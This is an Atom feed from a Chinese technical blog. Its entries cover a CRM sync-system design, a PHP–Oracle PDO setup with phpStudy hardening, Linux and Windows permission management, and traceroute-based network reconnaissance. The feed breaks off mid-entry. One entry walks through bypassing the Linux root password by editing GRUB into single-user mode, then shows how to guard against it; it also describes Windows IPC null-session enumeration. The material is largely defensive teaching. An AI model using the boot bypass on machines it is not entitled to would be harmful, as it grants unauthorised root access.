<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>howard技术空间</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.0bug.xyz/"/>
  <updated>2019-07-07T07:43:53.417Z</updated>
  <id>https://blog.0bug.xyz/</id>
  
  <author>
    <name>Howard Feng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一种同步系统设计方案</title>
    <link href="https://blog.0bug.xyz/2019/03/06/%E4%B8%80%E7%A7%8D%E5%90%8C%E6%AD%A5%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%A1%88/"/>
    <id>https://blog.0bug.xyz/2019/03/06/一种同步系统设计方案/</id>
    <published>2019-03-06T07:00:00.000Z</published>
    <updated>2019-07-07T07:43:53.417Z</updated>
    
    <content type="html"><![CDATA[<p>对于广告投放系统，有如下模块：</p><ul><li>落地页：用户点击广告位进入的广告展示页面。</li><li>蜂巢系统：用户提交的数据进行存储的模块。</li><li>CRM系统：客户关系系统，用于后台业务人员联系、分析用户的模块。</li><li><p>同步系统：蜂巢系统与CRM系统进行同步数据的模块。</p><a id="more"></a></li></ul><p>有如下业务逻辑：</p><p>用户点击广告进入广告落地页，用户在落地页填写个人信息后点击提交按钮，用户信息和广告唯一APPKEY被发送至蜂巢系统，蜂巢系统将用户数据进行存储。此后，同步系统将蜂巢系统获取的用户数据同步至到CRM系统。现需要设计一个完善的同步系统。同时，CRM系统有多种，要进行多系统适配。</p><h2 id="系统需求"><a href="#系统需求" class="headerlink" title="系统需求"></a>系统需求</h2><p>蜂巢系统与CRM系统数据的同步</p><h2 id="系统要求"><a href="#系统要求" class="headerlink" title="系统要求"></a>系统要求</h2><ul><li><p>高可用性</p></li><li><p>一致性</p></li><li><p>可恢复性</p></li></ul><h2 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h2><p>考虑到蜂巢系统对于可用性的要求可能较高，CRM系统对一致性要求较低，因此对于CAP理论，优先满足可用性(A)和分区容错性(P)，允许最终一致性。此种策略虽然会影响CRM系统使用体验，但没达到造成用户流失的程度。</p><p>因此同步系统采用轮询机制。即同步系统根据策略定时向蜂巢系统进行数据拉取。</p><p>同时以备数据丢失，将同步操作唯一ID以及同步数据存入Redis。</p><h2 id="数据同步流程"><a href="#数据同步流程" class="headerlink" title="数据同步流程"></a>数据同步流程</h2><ol><li>轮询服务器按照轮询策略发出请求，创建同步操作唯一ID</li><li>增量查询服务对蜂巢系统数据库进行查询，按照查询方案确定需要更新的数据</li><li>将同步操作唯一ID和同步数据存入Redis</li><li>将获取的更新数据发送给数据分发服务器</li><li>数据分发服务器将数据发送至主线队列，数据等待被处理</li><li>数据处理层根据队列中已经注册的数据同步请求，按顺序处理更新数据</li><li>数据处理层将更新数据更新至CRM系统中</li><li>记录操作日志</li></ol><p><img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/未命名文件.png" alt=""></p><h2 id="增量查询规则"><a href="#增量查询规则" class="headerlink" title="增量查询规则"></a>增量查询规则</h2><p>为蜂巢中的数据表添加<code>UpdateTime</code>字段。即对于蜂巢系统中，新增加一条记录时或者修改一条记录时，<code>UpdateTime</code>字段都会更新为当前的时间戳。</p><p>则对于<code>Insert</code>、<code>Update</code>操作的数据，增量查询服务器策略如下：</p><ul><li>初次同步时，记录一下最大的 <code>UpdateTime</code> 时间戳，保存到一个记录表中。</li><li>后续同步时，用记录表中的时间戳与蜂巢源表里的 <code>UpdateTime</code> 相比较，比时间戳大的说明是新添加的或者修改的数据。</li><li>当整个同步成功之后，更新最大的 <code>UpdateTime</code> 到记录表中。</li></ul><p>对于蜂巢中的删除操作，则可以在数据表中添加<code>IsDelete</code>字段，执行删除时，将<code>IsDelete</code>字段设置为1，同时更新<code>UpdateTime</code>，此时就相当于简单的Update数据。</p><h2 id="队列处理"><a href="#队列处理" class="headerlink" title="队列处理"></a>队列处理</h2><p>对于数据处理的性能问题，可以通过消息队列来一组一组处理订单数据，数据处理层前的等候队列划分为如下三层：主线队列、重试队列、死亡队列，处理流程为：</p><ol><li>把数据先放入主线队列，如果放置失败，将当前消息记录至恢复日志 </li><li>监听主线队列，获取队列数据并进行处理，处理失败放入重试队列</li><li>监听重试队列，过几秒获取队列数据并重新进行处理，若三次处理失败则放入死亡队列，不再进行重试，记录恢复日志，等待人工处理</li></ol><h2 id="恢复和监控"><a href="#恢复和监控" class="headerlink" title="恢复和监控"></a>恢复和监控</h2><h3 id="日志源"><a href="#日志源" class="headerlink" title="日志源"></a>日志源</h3><ul><li>恢复日志</li><li>其他异常情况下的日志记录，如网络无法连接、服务不可用等</li></ul><h3 id="数据恢复"><a href="#数据恢复" class="headerlink" title="数据恢复"></a>数据恢复</h3><ul><li>对于恢复日志记录的数据进行人工操作</li><li>对于其他异常造成的数据丢失，使用Redis内存储的数据进行恢复</li></ul><h3 id="应用监控"><a href="#应用监控" class="headerlink" title="应用监控"></a>应用监控</h3><p>大概需要下面几个监控的指标：</p><ul><li>监控队列个数以及每个队列的状态</li><li>任务错误数</li><li>目标CRM系统负载</li><li>Redis监控</li></ul><h3 id="操作日志数据结构"><a href="#操作日志数据结构" class="headerlink" title="操作日志数据结构"></a>操作日志数据结构</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"id"</span>: <span class="number">111</span>,</span><br><span class="line"><span class="attr">"data"</span>: [<span class="string">"insert into customer (APPKEY,uid,phone,UpdateTime) values ('ASDAD',12345,15888888888,65711321800)"</span>],</span><br><span class="line"><span class="attr">"start_at"</span>: <span class="number">65711321800</span>,</span><br><span class="line">    <span class="attr">"end_at"</span>: <span class="number">65711321801</span>,</span><br><span class="line"><span class="attr">"result"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>id</td><td>同步操作唯一ID</td></tr><tr><td>data</td><td>同步数据</td></tr><tr><td>start_at</td><td>操作开始时间</td></tr><tr><td>end_at</td><td>操作完成时间</td></tr><tr><td>result</td><td>操作结果</td></tr></tbody></table><h3 id="UML说明"><a href="#UML说明" class="headerlink" title="UML说明"></a>UML说明</h3><p><img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/CRMAdapter.png" alt=""></p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><table><thead><tr><th>类名</th><th>说明</th></tr></thead><tbody><tr><td>Poll</td><td>轮询服务器</td></tr><tr><td>Increment</td><td>增量查询服务器</td></tr><tr><td>DistributerCenter</td><td>数据分发中心</td></tr><tr><td>DataHandler</td><td>数据处理层</td></tr><tr><td>Queue</td><td>队列抽象类</td></tr><tr><td>MainQueue、RetryQuene、DeadQueue</td><td>主线队列、重试队列、死亡队列</td></tr><tr><td>CRMAdaper</td><td>CRM适配器接口</td></tr><tr><td>FirstCRMAdaper、SecendCRMAdapter</td><td>两种类型的CRM系统实现类</td></tr><tr><td>HTTP</td><td>请求类</td></tr></tbody></table><p><strong>图中蓝色线除抽象队列类和三个子类之间的代表实现关系外，其余代表依赖关系</strong></p><p><strong>白线代表泛化关系</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于广告投放系统，有如下模块：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;落地页：用户点击广告位进入的广告展示页面。&lt;/li&gt;
&lt;li&gt;蜂巢系统：用户提交的数据进行存储的模块。&lt;/li&gt;
&lt;li&gt;CRM系统：客户关系系统，用于后台业务人员联系、分析用户的模块。&lt;/li&gt;
&lt;li&gt;&lt;p&gt;同步系统：蜂巢系统与CRM系统进行同步数据的模块。&lt;/p&gt;
    
    </summary>
    
    
      <category term="系统设计" scheme="https://blog.0bug.xyz/tags/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>PHP使用PDO连接Oracle</title>
    <link href="https://blog.0bug.xyz/2018/10/16/phpToOracle/"/>
    <id>https://blog.0bug.xyz/2018/10/16/phpToOracle/</id>
    <published>2018-10-16T09:00:00.000Z</published>
    <updated>2018-10-17T16:48:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>　　一直以来，Mysql和php可以说是标配，使用起来基本不需要额外的配置。但最近给学校做的一些项目里多数用到的是Oracle，初次尝试时还遇到了很多坎。这是第四次搭建php和Oracle环境了，前面踩了很多坑，这里就记录下。<br>  <a id="more"></a></p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>Windows Server 2008 R2</li><li>phpStudy 2018 (php 7.2.10)</li><li>Oracle11g_home1</li></ul><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h5 id="安装phpStudy"><a href="#安装phpStudy" class="headerlink" title="安装phpStudy"></a>安装phpStudy</h5><p>本次在windows下搭建环境直接就使用 phpStudy了，但其有一些漏洞，后面在准备上线时再详细一说。</p><h5 id="修改php配置"><a href="#修改php配置" class="headerlink" title="修改php配置"></a>修改php配置</h5><p>在php-ini中将  <code>extension=php_oci8_12c.dll</code> <code>extension=php_pdo_oci.dll</code> 两个扩展的注释去掉</p><p><img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/phppdo/1.jpg" alt="php-ini"></p><p>在PHP扩展中打开 <code>php_oci8</code> <code>php_oci8_11g</code> <code>php_pdo_oci</code>和其他项目中需要用到的扩展</p><p>重启phpStudy</p><h5 id="配置oracle客户端"><a href="#配置oracle客户端" class="headerlink" title="配置oracle客户端"></a>配置oracle客户端</h5><p>在php中连接Oracle和连接Mysql不同，此时需要下载相应的Oracle的客户端，我们可以到<a href="https://www.oracle.com/technetwork/database/database-technologies/instant-client/downloads/index.html" target="_blank" rel="noopener">Oracle官网</a>进行下载。</p><p>此处需要格外注意的是客户端版本的选择，Oracle Instant Client的版本选择应该是要和<strong><code>PHP的版本</code></strong>相同而不是和<strong><code>操作系统</code></strong>的位数相同。此处使用的是phpStudy，其中的php是32位的，所以此处要选择32-bit的Oracle Instant Client进行下载。</p><p>然后添加两个系统变量并修改PATH变量</p><ul><li><code>NLS_lANG</code> 保存为SIMPLIFIED CHINESE_CHINA.ZHS16GBK，为了解决读取编码问题</li><li><code>PATH</code>  添加客户端目录</li></ul><blockquote><p>此处为了使系统变量立即生效而不重启，可以进入CMD，输入 <code>set PATH=C:</code>然后重启CMD，再输入<code>echo %PATH%</code> ，此番便可以看到，系统变量已经生效。 </p></blockquote><p>此时重启phpStudy，然后刷新phpinfo界面，再PDO drivers 处应该就可以看到oci被开启</p><p><img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/phppdo/3.jpg" alt="pdo"></p><blockquote><p>如果此时该处无oci被开启的提示，可以在php的目录下执行<code>php -m</code>查看模块是否加载</p><p>如果是新装的机子，可能会出现<code>msvcr110.dll</code>,<code>msvcr100.dll</code>等链接库找不到,或者模块无法加载，此时下载相应版本的文件并放到正确的文件夹内即可。我这里出现的问题就是这一个，将动态库补充完整就会显示出来</p></blockquote><h5 id="PDO连接数据库"><a href="#PDO连接数据库" class="headerlink" title="PDO连接数据库"></a>PDO连接数据库</h5><p>此处给出pdo连接的一个小例子:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'TNS'</span>, <span class="string">"(DESCRIPTION =(ADDRESS_LIST =(ADDRESS = (PROTOCOL = TCP)(HOST = 127.0.0.0.1)(PORT = 1521)))(CONNECT_DATA =(SERVICE_NAME = orcl)))"</span>);</span><br><span class="line">        $db_username = <span class="string">"user"</span>;</span><br><span class="line">        $db_password = <span class="string">"pass"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pdo = <span class="keyword">new</span> PDO(<span class="string">"oci:dbname="</span> . TNS . <span class="string">';charset=utf8'</span>, $db_username, $db_password);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pdo-&gt;query(<span class="string">"SET NAMES GBK"</span>);  <span class="comment">// $_pdo-&gt;exec('SET NAMES utf8');  //设置数据库编码，两种方法都可以</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">            <span class="keyword">echo</span>($e-&gt;getMessage());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>此处需要注意的是,在php Manual上，官方给出的例子是将<code>tns</code>定义为一个变量，而在我的环境的实际操作中，这样并不能连接成功，而将其定义为常量时，一切恢复正常</p><h5 id="加强phpStudy"><a href="#加强phpStudy" class="headerlink" title="加强phpStudy"></a>加强phpStudy</h5><p>以上操作结束后，就可以进行业务的开发了。但是如果作为正式上线的项目话，如果被漏扫，会被扫出很多漏洞。学校在我还没有开发完就给我扫了一遍，结果给我了一份长达95页的漏洞报告，而其中90%的都是目录浏览的漏洞，还有一些跨站脚本的问题。</p><p>因为phpStudy多作为开发环境，有很多利于开发者测试的配置默认开启，因此如果作为线上使用的话，建议进行配置更改。我这里做了如下操作:</p><ul><li>删除www目录下phpMyadmin和index.php,l.php,phpinfo.php等危险脚本</li><li>设置目录列表禁止浏览</li><li>通过添加<code>server_tokens off</code>关闭nginx版本显示</li><li>修改Mysql默认密码,甚至删除</li><li>删除无用服务</li></ul><hr><p>此处再记录一个phpStudy因为nginx配置而引发的文件类型错误解析漏洞:</p><p>因为nginx的不当配置,使得像图片等类型的文件可以被当作php脚本被执行，详细可参考<a href="https://my.oschina.net/mark35/blog/33597" target="_blank" rel="noopener">这一篇文章</a></p><p>另外还有当时遇到的另一个问题</p><blockquote><p>SQLSTATE[HY000]: OCIEnvNlsCreate: Check the character set is valid and that PHP has access to Oracle libraries and NLS data (ext\pdo_oci\oci_driver.c:619).</p></blockquote><p>这个问题也是绞尽脑汁，各种搜索请教迟迟不能解决,在stackoverflow上提问也无济于事，后来自己蜜汁修好了… 解决方法在此:<a href="https://stackoverflow.com/questions/50202449/pdos-error-with-oracle" target="_blank" rel="noopener">Magic Problem</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;　　一直以来，Mysql和php可以说是标配，使用起来基本不需要额外的配置。但最近给学校做的一些项目里多数用到的是Oracle，初次尝试时还遇到了很多坎。这是第四次搭建php和Oracle环境了，前面踩了很多坑，这里就记录下。&lt;br&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="https://blog.0bug.xyz/tags/PHP/"/>
    
      <category term="Oracle" scheme="https://blog.0bug.xyz/tags/Oracle/"/>
    
  </entry>
  
  <entry>
    <title>权限管理与密码破解</title>
    <link href="https://blog.0bug.xyz/2018/01/20/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E4%B8%8E%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>https://blog.0bug.xyz/2018/01/20/权限管理与密码破解/</id>
    <published>2018-01-20T08:00:00.000Z</published>
    <updated>2019-01-21T16:36:36.722Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Linux下权限管理"><a href="#Linux下权限管理" class="headerlink" title="Linux下权限管理"></a>Linux下权限管理</h3><h4 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h4><blockquote><ul><li>-d 用户的home目录</li><li>-e 用户的过期时间，在此时间以前账号有效，过期后自动失效</li><li>-g 指定用户所属的组，指定的组必须已经存在</li><li>-m 如用户的起始home目录不存在，即建立</li><li>-M 不创建用户起始home目录</li><li>-D 显示或修改默认属性<a id="more"></a></li></ul></blockquote><h4 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h4><blockquote><ul><li>-r 将此用户起始目录及其中文件删除 </li></ul></blockquote><h4 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h4><blockquote><p>修改用户属性，参数同useradd</p></blockquote><h4 id="su"><a href="#su" class="headerlink" title="su"></a>su</h4><blockquote><p>该命令用于切换用户<br>原则上禁止切换至root用户<br>因此可在su配置文件（在”/etc/pam.d/“目录下）的开头添加下面两行：<br><code>auth sufficient /lib/security/pam_rootok.so debug</code><br><code>auth required /lib/security/Pam_wheel.so group=wheel</code></p></blockquote><blockquote><p>即只有wheel组的可切换为root</p></blockquote><p>groupadd blue<br>gpasswd -a -username groupname</p><blockquote><p>添加wheel用户组、将指定用户添加至指定用户组内</p></blockquote><h4 id="chgrp"><a href="#chgrp" class="headerlink" title="chgrp"></a>chgrp</h4><blockquote><p>change group 即切换文件所属分组</p></blockquote><h4 id="chown"><a href="#chown" class="headerlink" title="chown"></a>chown</h4><blockquote><p>change owner 修改文件所有者</p></blockquote><h4 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h4><blockquote><ul><li>r： 4（读权限</li><li>w： 2（写权限）</li><li>x： 1（执行权限）</li></ul></blockquote><p>使用数字更改权限</p><blockquote><p>chmod xyz file/dir</p></blockquote><p>使用字符更改权限</p><blockquote><p>chmod u=wrx,go=rx file/dir<br>chmod a+x file/dir</p></blockquote><h4 id="usermod-1"><a href="#usermod-1" class="headerlink" title="usermod"></a>usermod</h4><blockquote><p>修改账户的信息</p><ul><li>-L 锁定账户</li><li>-U 解锁账户密码</li></ul></blockquote><h4 id="chattr"><a href="#chattr" class="headerlink" title="chattr"></a>chattr</h4><blockquote><p>用于修改文件属性</p></blockquote><p> +i</p><blockquote><p>使文件只读、不可任意更改等</p></blockquote><p>+a</p><blockquote><p>使文件只可追加不可删除，适用于各类日志文件    </p></blockquote><h3 id="Win下权限管理"><a href="#Win下权限管理" class="headerlink" title="Win下权限管理"></a>Win下权限管理</h3><h4 id="安全标识符SID"><a href="#安全标识符SID" class="headerlink" title="安全标识符SID"></a>安全标识符SID</h4><blockquote><p>SID是一个具有惟一性、绝对不会重复产生的数值,用来标识操作系统中的安全主体或安全组</p></blockquote><h4 id="四项基本原则："><a href="#四项基本原则：" class="headerlink" title="四项基本原则："></a>四项基本原则：</h4><ul><li>拒绝优先原则</li><li>权限最小化原则</li><li>权限继承原则</li><li>累加原则</li></ul><h4 id="磁盘配额"><a href="#磁盘配额" class="headerlink" title="磁盘配额"></a>磁盘配额</h4><blockquote><p>磁盘配额可以跟踪及控制磁盘空间的使用情况。包含磁盘配额限制和磁盘配额警告级别两个参数，前者触发报警阻止，后者触发记录。</p></blockquote><h3 id="Linux单用户模式修改root密码"><a href="#Linux单用户模式修改root密码" class="headerlink" title="Linux单用户模式修改root密码"></a>Linux单用户模式修改root密码</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h4><blockquote><p>当Linux启动级别设置为1时，系统进入单用户模式在此模式下，不会启动任何服务，也无需输入root密码，甚至可以直接修改root密码。此方法常在忘记root密码时使用，但当物理机可被他人操控时，则有很大的安全隐患。但好在我们可以对进入单用户模式进行一定的限制，在进入前让用户输入密码来确保安全性。(计算机启动流程可以参考阮一峰老师的两篇文章: <a href="http://www.ruanyifeng.com/blog/2013/02/booting.html" target="_blank" rel="noopener">计算机是如何启动的</a> 、<a href="http://www.ruanyifeng.com/blog/2013/08/linux_boot_process.html" target="_blank" rel="noopener">Linux 的启动流程</a> )</p></blockquote><h4 id="1、进入操作系统配置引导界面并进入编辑页面"><a href="#1、进入操作系统配置引导界面并进入编辑页面" class="headerlink" title="1、进入操作系统配置引导界面并进入编辑页面"></a>1、进入操作系统配置引导界面并进入编辑页面</h4><p> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/1.jpg" alt=""><br>输入回车进入高级选项<br>找到Recovery mode选中<br><img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/4.jpg" alt=""></p><p>根据下面的提示可知，输入<code>e</code>可以对配置进行编辑</p><h4 id="2、找到类似Linux-boot-vmlinuz所在行"><a href="#2、找到类似Linux-boot-vmlinuz所在行" class="headerlink" title="2、找到类似Linux /boot/vmlinuz所在行"></a>2、找到类似Linux /boot/vmlinuz所在行</h4><p>将<code>ro single</code>改成<code>rw single</code>,并在最后添加<code>inti=/bin/bash</code><br><img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/2.jpg" alt=""> </p><p>这样我们就可以告诉系统我们需要以单用户的模式登陆了<br>然后 按键盘 <code>ctrl+x</code> 启动</p><blockquote><p>对于一些版本的OS（如redhat、centos）来说，编辑grub，在后面加上<code>single</code>即可进入单用户模式。但对于此处用来做示范的kali以及Ubuntu等此种方法无效。前者在进入编辑界面后，在选项中会明显的显示出对内核编辑选项，按照下方提示，输入<code>e</code> 并在最后添加<code>single</code>或者<code>1</code>即可。</p></blockquote><h4 id="3、使用passwd修改root密码"><a href="#3、使用passwd修改root密码" class="headerlink" title="3、使用passwd修改root密码"></a>3、使用passwd修改root密码</h4><p><img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/3.jpg" alt=""></p><p>之后我们使用<code>exit</code>命令退出单用户模式，然后重启正常进入多用户模式即可~</p><h4 id="4、为单用户模式添加密码保护"><a href="#4、为单用户模式添加密码保护" class="headerlink" title="4、为单用户模式添加密码保护"></a>4、为单用户模式添加密码保护</h4><blockquote><p>注意此处redhat系和debian系也略有不同</p></blockquote><h5 id="debian"><a href="#debian" class="headerlink" title="debian"></a>debian</h5><ul><li>使用grub-mkpasswd-pbkdf2生成加密密码<br><img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/5.jpg" alt=""></li><li><blockquote><p>在这个地方我竟然把连字符输成了下划线……找不到该命令，困惑了好久…………</p></blockquote></li><li><p>在/etc/grub.d/40_custom末尾加入以下代码来对grub进行加密：</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set superusers=<span class="string">"root"</span>                 </span><br><span class="line">password_pbkdf2  root  grub.pbkdf2.sha512.<span class="number">10000</span>.E944BC7C234B86C75D7CEE3D7D7753F35352F99E45E461F3BD12768F3D9525B84A62E62632EFDD0419425E3BCCD50279D9474A8D76DAF73A76079F8E5768152E.<span class="number">66369847376</span>BB3A56C5D21668A343E429A84E13D816DFAA3BC37B9F963C51805DB896F8155B6030455E8D32443FBDEFF936D8795F0BE891075A223B1B0F9AFCE <span class="comment">#后面一串密文为上面生成的密码</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/6.jpg" alt=""></p><ul><li><code>update-grub</code>命令进行更新</li></ul><h5 id="redhat"><a href="#redhat" class="headerlink" title="redhat"></a>redhat</h5><ul><li><p>使用grub-md5-crypt 生成加密密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@feng~]<span class="comment"># grub-md5-crypt </span></span><br><span class="line">Password: </span><br><span class="line">Retype password: </span><br><span class="line"><span class="variable">$1</span><span class="variable">$UGA2B1</span><span class="variable">$DriIdrVTEgVg95fHHX4H</span>./</span><br><span class="line">[root@feng~]<span class="comment">#</span></span><br></pre></td></tr></table></figure></li><li><p>在 /boot/grub/grub.conf 启动配置中加入以下代码来对grub进行加密：<br><code>password --md5 $1$6H92B1$PzoPV63kTMk4uEhZQTAZ//</code></p></li></ul><p>最后重启看一下效果：</p><p><img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/7.jpg" alt=""></p><p>现在进入高级选项需要输入用户名和密码了！起到了保护的作用。但这个密码如果忘记的话，就真的没有补救的方法了……</p><blockquote><p>参考链接 <a href="http://www.cnblogs.com/xiaoluo501395377/archive/2013/05/19/3087664.html" target="_blank" rel="noopener">Linux学习之CentOS(二十二)–单用户模式下修改Root用户的密码</a></p></blockquote><h3 id="Windows利用空会话IPC共享实现远程控制"><a href="#Windows利用空会话IPC共享实现远程控制" class="headerlink" title="Windows利用空会话IPC共享实现远程控制"></a>Windows利用空会话IPC共享实现远程控制</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><blockquote><p>当用户使用用户名和密码(可以访问系统资源的登陆帐户)远程登陆到计算机时就创建了一个远程会话，这是通过服务器消息模块(SMB)和Windows Server服务来实现的，当提供正确登陆信息时这些连接都是完全合理的。</p></blockquote><blockquote><p>当用户没有使用用户名或者密码来与windows系统建立连接时就会出现空会话，这种类型的连接不能进行任何典型的windows共享，但是可以进行进程间通信(IPC)管理共享。IPC共享，是windows进程(通过SYSTEM用户名)来与网络其他进程进行通信的，IPC共享是SMB协议专用的。</p></blockquote><blockquote><p>没有登陆凭证使用IPC共享是专供程序间通信使用的，但这并不是说用户不能通过IPC连接代替连接到计算机。这种方式不允许对计算机的无限制访问，但广泛枚举可能会帮助攻击者发起攻击。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Linux下权限管理&quot;&gt;&lt;a href=&quot;#Linux下权限管理&quot; class=&quot;headerlink&quot; title=&quot;Linux下权限管理&quot;&gt;&lt;/a&gt;Linux下权限管理&lt;/h3&gt;&lt;h4 id=&quot;useradd&quot;&gt;&lt;a href=&quot;#useradd&quot; class=&quot;headerlink&quot; title=&quot;useradd&quot;&gt;&lt;/a&gt;useradd&lt;/h4&gt;&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;-d 用户的home目录&lt;/li&gt;
&lt;li&gt;-e 用户的过期时间，在此时间以前账号有效，过期后自动失效&lt;/li&gt;
&lt;li&gt;-g 指定用户所属的组，指定的组必须已经存在&lt;/li&gt;
&lt;li&gt;-m 如用户的起始home目录不存在，即建立&lt;/li&gt;
&lt;li&gt;-M 不创建用户起始home目录&lt;/li&gt;
&lt;li&gt;-D 显示或修改默认属性
    
    </summary>
    
    
      <category term="权限管理" scheme="https://blog.0bug.xyz/tags/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>网络踩点、路由信息探测</title>
    <link href="https://blog.0bug.xyz/2018/01/18/%E7%BD%91%E7%BB%9C%E8%B8%A9%E7%82%B9/"/>
    <id>https://blog.0bug.xyz/2018/01/18/网络踩点/</id>
    <published>2018-01-18T06:00:00.000Z</published>
    <updated>2018-10-15T20:24:41.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="网络踩点、路由信息探测"><a href="#网络踩点、路由信息探测" class="headerlink" title="网络踩点、路由信息探测"></a>网络踩点、路由信息探测</h4><p><strong>tracert命令(win下)</strong></p><blockquote><p>tracert命令诊断实用程序通过向目标计算机发送具有不同生存时间的ICMP数据包，来确定至目标计算机的路由，也就是说用来跟踪一个消息从一台计算机到另一台计算机所走的路径。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tracert [-d] [-h maximum_hops] [-j computer-list] [-w timeout] target_name</span><br></pre></td></tr></table></figure>  <a id="more"></a><blockquote><ul><li>-d<br>指定不对计算机名解析地址。   </li><li>-h   maximum_hops<br>指定查找目标的跳转的最大数目。   </li></ul></blockquote><blockquote><ul><li>-w   timeout<br>等待由   timeout   对每个应答指定的毫秒数。   </li><li>target_name<br>目标计算机的名称。</li></ul></blockquote><p><strong>traceroute命令(linux下)</strong><br><strong>原理：</strong></p><blockquote><p>Traceroute在dos下它通过发送Internet控制消息协议 (ICMP) 回显请求和回显答复消息，而在Linux下发送端发送的是<strong>UDP</strong>数据包，产生关于经过每个路由器的命令行报告输出，从而跟踪路径。</p></blockquote><blockquote><p>Traceroute程序的设计是利用ICMP及IP header的TTL。首先，traceroute送出一个TTL是1的IP 数据报到目的地，当路径上的第一个路由器收到这个数据报时，TTL减1。此时，TTL变为0了，所以该路由器会将此数据报丢掉，并送回一个「ICMP time exceeded」消息，traceroute 收到这个消息后，便知道这个路由器存在于这个路径上，接着traceroute 再送出另一个TTL是2 的数据报，发现第2 个路由器…… traceroute 每次将送出的数据报的TTL 加1来发现另一个路由器，这个重复的动作一直持续到某个数据报抵达目的地。当数据报到达目的地后，该主机并不会送回ICMP time exceeded消息，因为它已是目的地了，</p></blockquote><blockquote><p>Traceroute提取发 ICMP TTL到期消息设备的IP地址并作域名解析。每次 ，Traceroute都打印出一系列数据,包括所经过的路由设备的域名及 IP地址,三个包每次来回所花时间。</p></blockquote><blockquote><p>Traceroute 有一个固定的时间等待响应(ICMP TTL到期消息)。如果这个时间过了，它将打印出一系列的*号表明：在这个路径上，这个设备不能在给定的时间内发出ICMP TTL到期消息的响应。然后，Traceroute给TTL记数器加1，继续进行。</p></blockquote><p>–<br>一些服务器有时会把UDP数据包屏蔽，所以不会返回ICMP。因此要使用TCP进行探测</p><blockquote><p>traceroute -T -p 80 domain.com</p></blockquote><h4 id="安全扫描技术-脆弱性评估"><a href="#安全扫描技术-脆弱性评估" class="headerlink" title="安全扫描技术(脆弱性评估)"></a>安全扫描技术(脆弱性评估)</h4><p><strong>xscan</strong></p><blockquote><p>国内著名的民间黑客组织”安全焦点”完成</p></blockquote><p><strong>wvs</strong></p><h4 id="明文嗅探"><a href="#明文嗅探" class="headerlink" 